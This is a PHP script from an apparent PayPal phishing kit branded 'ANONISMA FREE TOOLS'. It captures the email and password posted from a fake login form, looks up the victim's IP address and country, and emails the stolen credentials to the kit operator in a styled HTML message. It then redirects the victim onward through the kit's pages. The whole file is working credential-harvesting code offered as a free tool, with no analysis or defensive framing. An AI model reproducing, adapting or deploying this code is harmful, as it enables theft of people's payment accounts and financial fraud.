<?php
error_reporting(0);
session_start();
set_time_limit(0);
$email    = $_SESSION['_email_']        = $_POST['EM'];
$pwd      = $_SESSION['_password_']     = $_POST['PS'];
/** 
----------------------------------------------------------------------------------------------------------------------	
     _      _   _    ___    _   _   ___   ____    __  __      _      
    / \    | \ | |  / _ \  | \ | | |_ _| / ___|  |  \/  |    / \     
   / _ \   |  \| | | | | | |  \| |  | |  \___ \  | |\/| |   / _ \    
  / ___ \  | |\  | | |_| | | |\  |  | |   ___) | | |  | |  / ___ \   
 /_/   \_\ |_| \_|  \___/  |_| \_| |___| |____/  |_|  |_| /_/   \_\_____ FREE TOOlS 2015-2016 ==> MA DZ TN V2
                                                                                                                                                                                       ----------------------------------------------------------------------------------------------------------------------	                                            
**/	
include('../../edit/bots.php');	
include('../../edit/______________email.php');	
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip . "");
$codecountryy      = $details->geoplugin_countryCode;
$smiyacountry = $details->geoplugin_countryName;
$codecountry = strtolower($codecountryy);
$cartamensaje = "<!DOCTYPE html><html> <head> 
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"> 
    <meta name=\"viewport\" content=\"width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;\"> 
    <style type=\"text/css\">body { width: 100% !important;}</style> 
  </head> 
  <body class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"   style=\"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: #e9e9e9\"> 
    <table class=\" ".md5(gmdate('r'))." \" style=\"WIDTH: 100%\"> 
      <tbody class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"  > 
        <tr class=\" ".md5(gmdate('r'))." \"> 
          <td  for=\" ".md5(gmdate('r'))." \"  style=\" BACKGROUND-COLOR: #e9e9e9\" align=\"center\"> 
            <table class=\" ".md5(gmdate('r'))." \" width=\"600\" border=\"0\"> 
              <tbody class=\" ".md5(gmdate('r'))." \"> 
                <tr> 
                  <td class=\" ".md5(gmdate('r'))." \"> 
                    <div class=\" ".md5(gmdate('r'))." \"> 
                      <table class=\" ".md5(gmdate('r'))." \" for=\" ".md5(gmdate('r'))." \"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                        <tbody  for=\"". rand(99999999999, 999999999999999999999999)."\"  > 
                          <tr class=\" ".md5(gmdate('r'))." \"> 
                            <td class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius: 10px 10px 0px 0px\"> 
                              <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                                <tbody> 
                                  <tr> 
                                    <td class=\" ".md5(gmdate('r'))." \"> 
                                      <div class=\" ".md5(gmdate('r'))." \" id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"LINE-HEIGHT: 30px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
                                        <p> 
                                        <div class=\" ".md5(gmdate('r'))." \"  for=\" ".md5(gmdate('r'))." \"   style=\"FONT-SIZE: 10px; FONT-FAMILY: Arial black; COLOR: #828282;\" > 
                                          <p style=\"FONT-SIZE: 27px\"><strong><font color=\"#7E7E7E\"> \ ◇ ◇ ◇  <font size=\"6\">☠</font> MA DZ TN <font size=\"6\">☠</font>  ◇ ◇ ◇  / </font></strong> 
                                          </p> 
                                        </div> 
                                        </p> 
                                      </div> 
                                    </td> 
                                  </tr> 
                                </tbody> 
                              </table> 
                            </td> 
                          </tr> 
                        </tbody> 
                      </table> 
                    </div> 
                    <div> 
                    <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                      <tbody class=\" ".md5(gmdate('r'))." \"> 
                        <tr> 
                          <td class=\" ".md5(gmdate('r'))." \" style=\" BACKGROUND: #F5F5F5 ; LINE-HEIGHT: 22px;border-top:2px solid #7E7E7E\"> 
                            <table cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                              <tbody> 
                                <tr> 
                                  <td> 
                                    <div class=\" ".md5(gmdate('r'))." \"  for=\" ".md5(gmdate('r'))." \"  align=\"center\" style=\"width:100%;padding: 15px 0px 15px 0px;FONT-SIZE: 14px; FONT-FAMILY: Arial; COLOR: #747474;\"> 
                                    <b><font color=\"#7E7E7E\">★ PAYPAL LOGIN ACCOUNT ★</font></b> 
                                  </td> 
                                </tr> 
                                <tr class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
                                  <td> 
                                    <div  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
                                     " .$_POST['EM']." 
                                    </div> 
                                    <div class=\" ".md5(gmdate('r'))." \" for=\" ".md5(gmdate('r'))." \"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 5px 0px 4px 0px\">						   
                                     " .$_POST['PS']." 
                                    </div> 
                                  </td> 
                                </tr> 
                                <tr class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #FFFFFF; COLOR: #747474;\"> 
                                  <td> 
                                    <div  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  align=\"center\" style=\"FONT-SIZE: 12px; font weight: bold ;width:100%;padding: 4px 0px 4px 0px\"> 
                                      " .$smiyacountry." 
                                    </div> 
                                  </td> 
                                </tr>  					   
                              </tbody> 
                            </table> 
                          </td> 
                        </tr> 
                      </tbody> 
                    </table> 
                    </div> 
                    <div> 
                      <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                        <tbody class=\" ".md5(gmdate('r'))." \"> 
                          <tr> 
                            <td class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 27px\"> 
                              <table  for=\"". rand(99999999999, 999999999999999999999999)."\"   width=\"600\" align=\"left\" border=\"0\"> 
                                <tbody class=\" ".md5(gmdate('r'))." \"> 
                                  <tr> 
                                    <!-- -->							   
                                  </tr> 
                                </tbody> 
                              </table> 
                            </td> 
                          </tr> 
                        </tbody> 
                      </table> 
                    </div> 
                    <div class=\" ".md5(gmdate('r'))." \"> 
                    <table class=\" ".md5(gmdate('r'))." \"  id=\"". rand(99999999999999, 9999999999999999999999999)."\"  cellspacing=\"0\" cellpadding=\"0\" width=\"600\" border=\"0\"> 
                      <tbody> 
                        <tr> 
                          <td class=\" ".md5(gmdate('r'))." \" for=\"". rand(99999999999, 999999999999999999999999)."\"    style=\" BACKGROUND: #ffffff;  LINE-HEIGHT: 22px;border-radius:0px 0px 10px 10px\"> 
                            <table class=\" ".md5(gmdate('r'))." \" cellspacing=\"0\" cellpadding=\"0\" width=\"600\" align=\"left\" border=\"0\"> 
                              <tbody> 
                                <tr class=\" ".md5(gmdate('r'))." \"> 
                                  <td> 
                                    <div class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\"FONT-SIZE: 9px; FONT-FAMILY: Arial; COLOR: #747474;margin-left:30px;margin-right:30px\"> 
                                      <hr size=\"2\" color=\"#F0F0F0\" width=\"100%\"> 
                                      <p align=\"center\" > 
                                        ---- | ★ ★ ★ ANONISMA FREE TOOLS ★ ★ ★ | ---- 
                                      </p> 
                                  </td> 
                                </tr> 
                              </tbody> 
                            </table> 
                          </td> 
                        </tr> 
                      </tbody> 
                    </table> 
                    </div> 
                  </td> 
                </tr> 
                <tr class=\" ".md5(gmdate('r'))." \"> 
                  <td class=\" ".md5(gmdate('r'))." \"  for=\"". rand(99999999999, 999999999999999999999999)."\"   style=\" PADDING-TOP: 10px; \" align=\"center\"> 
                    <div class=\" ".md5(gmdate('r'))." \" align=\"center\" style=\"FONT-SIZE: 11px; FONT-FAMILY: Arial; COLOR: #959595;\"> 
                      <p> 
                        بعيدا عن السبام 
                        <br> 
                        سهر + برمجة + سكريبتات + الشبكات + تواضع = صرف و إحترام 
                        <br> 
                        تدوين + تقنية + ربح + بلوكر= شاعر معلوماتي عباد االأسهم  
                        <br> 
                        الجديد إصنعه بيدك لنغير سلوكنا 
                      </p> 
                    </div> 
                  </td> 
                </tr> 
              </tbody> 
            </table> 
          </td> 
        </tr> 
      </tbody> 
    </table> 
  </body> 
</html>";
$subject = "LOGIN / EMAIL / PASSD / =?UTF-8?Q?=e2=9d=a4_?=  $ip =?UTF-8?Q?=E2=9C=94_?= ";
$headers = "From: ANONISMA SMART <hema.sehs50@gmail.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
mail($enviardatos,$subject,$cartamensaje,$headers);							 
//----------------------------------------------------------------------------ANONISMA FREE TOOLS 2015-2016 
	$An		 = rand(999999999999999999, 999999999999999999999999999);
	$Oni	 = md5(gmdate('r'));
	$Sma 	 = $details->geoplugin_countryName;
	$VFinal	 = $details->geoplugin_countryCode;
	$xx 	 = "_";
	$idd 	 = rand(9999, 999999);
        echo "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> 
<script language=\"javascript\"> 
var page = \"../account.php?id=.$idd.$VFinal.$xx.$An.$xx.$Oni.$xx.$Sma\"           
top.location = page; 
</script>  
</head> 
</html>\n"; 
?>